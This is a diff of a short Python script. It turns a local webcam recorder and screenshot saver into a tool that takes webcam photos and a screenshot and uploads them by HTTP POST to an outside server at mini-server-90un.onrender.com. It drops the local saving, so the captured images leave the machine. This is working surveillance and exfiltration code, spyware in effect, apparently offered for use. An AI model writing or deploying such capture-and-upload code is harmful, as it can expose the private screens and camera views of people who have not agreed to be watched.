@@ -1,57 +1,59 @@
 import cv2
-import os
-from pathlib import Path
-from datetime import datetime
 import time
 from PIL import ImageGrab
 from multiprocessing import Process
+import requests
+import numpy
 
-def camera(path):
-    cam_path = os.path.join(path, 'camera')
-    Path(cam_path).mkdir(parents=True, exist_ok=True)
+def camera():
 
     cam = cv2.VideoCapture(0)
     
     if not cam.isOpened():
       raise RuntimeError("Cannot open camera")
     else:
-       timenow = datetime.now().strftime("%Y%m%d_%H%M%S")
-       file = os.path.join(cam_path, f'{timenow}.mp4')
-       width  = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
-       height = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
-       output = cv2.VideoWriter(file, cv2.VideoWriter_fourcc(*'mp4v'), 30, (width, height))
-       while True:
-         ret, vid = cam.read()
+       for x in range(2):
+         ret, shot = cam.read()
+         _, img_encoded = cv2.imencode('.png', shot)
          if not ret:
-          raise RuntimeError("Cannot record video")
-         output.write(vid)
-         cv2.imshow("Recording (press ESC to stop)", vid)
+          raise RuntimeError("Cannot take photo")
+         try:
+          files = {'file': ('frame.png', img_encoded.tobytes(), 'image/png')}
+          response = requests.post("https://mini-server-90un.onrender.com/send", files=files)
+         except requests.exceptions.RequestException as e:
+           print('Error sending shot', e)
+         print(response.text)
+         cv2.imshow("Recording (press ESC to stop)", shot)
          key = cv2.waitKey(1) 
          if key == 27:
            break
-       output.release()
+         time.sleep(5)
        cam.release()
        cv2.destroyAllWindows()
 
-def screen_grabber(file_path):
-   pic_path = os.path.join(file_path,'screenshots')
-   Path(pic_path).mkdir(parents=True, exist_ok=True)
-   for x in range(10):
-      pic = ImageGrab.grab()
-      timenow = datetime.now().strftime("%Y%m%d_%H%M%S")
-      file = os.path.join(pic_path,f'{timenow}.jpg')
-      pic.save(file)
+def screen_grabber():
+   for x in range(1):
+      screen = ImageGrab.grab()
+      screen_np = numpy.array(screen)
+      screen_np = cv2.cvtColor(screen_np, cv2.COLOR_RGB2BGR)
+      _, img_encoded = cv2.imencode('.png', screen_np)
+      files = {'file': ('frame.png', img_encoded.tobytes(), 'image/png')}
+      try:
+        response = requests.post("https://mini-server-90un.onrender.com/send", files=files)
+        print(response.text)
+      except requests.exceptions.RequestException as e:
+        print("Error sending screenshot", e)
       time.sleep(5)
       
 def main():
-  p1 = Process(target=camera, args=('C:\\Noor\\Desktop',)) 
-  p2 = Process(target=screen_grabber, args=('C:\\Noor\\Desktop',))  
+  p1 = Process(target=camera, args=()) 
+  p2 = Process(target=screen_grabber, args=())  
 
   p1.start()
   p2.start()
   
   p1.join()
-  p1.join()
-
+  p2.join()
+  
 if __name__ == "__main__":
     main()
